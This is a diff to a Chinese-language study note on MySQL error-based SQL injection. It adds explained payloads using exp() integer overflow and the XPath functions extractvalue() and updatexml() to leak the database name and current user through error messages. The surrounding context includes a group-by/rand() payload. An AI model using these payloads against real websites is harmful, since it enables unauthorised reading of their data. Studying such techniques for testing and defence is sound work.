@@ -83,7 +83,22 @@ group by
 ?id = 1' or 1=1 group by concat(database(),floor(rand()*2)) having min(0)--+
 ```
 ```floor(rand()x2)``` 為穩定序列，造成```group by key```的碰撞! (非常推薦以下文章
-[The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)
+[The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)  
+* Interger Overflow  
+```exp()```在sql版本大於5.5.5時才會有error  
+```sql
+exp(~(select*from(select user())a));  // 內部查詢結果為0, 經過逐位取反(~)後得到的是18446744073709551615,然而exp(710)就會溢出!
+// 後面的a ? 是alias, select*from 後再做子查詢需要給他別名
+```
+```select```回傳結果也可以用於計算，查詢成功->0，失敗->1 (非常重要!  
+[The recommended article](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/)  
+* xpath syntax error  
+```extractvalue()```,```updatexml()```諸如此類函數可以對user指定xml語法做查詢語修改  
+```sql
+?id=1" or/and select extractvalue(1,concat(1,(select database()),0x7e));
+?id=1" or/and select updatexml(1,concat(1,(select user()),0x7e),1);
+// 由於中間xml語法錯誤，會將database()結果顯示於錯誤訊息
+```
   
 ### WAF bypass
 WAF is a defender for web.  
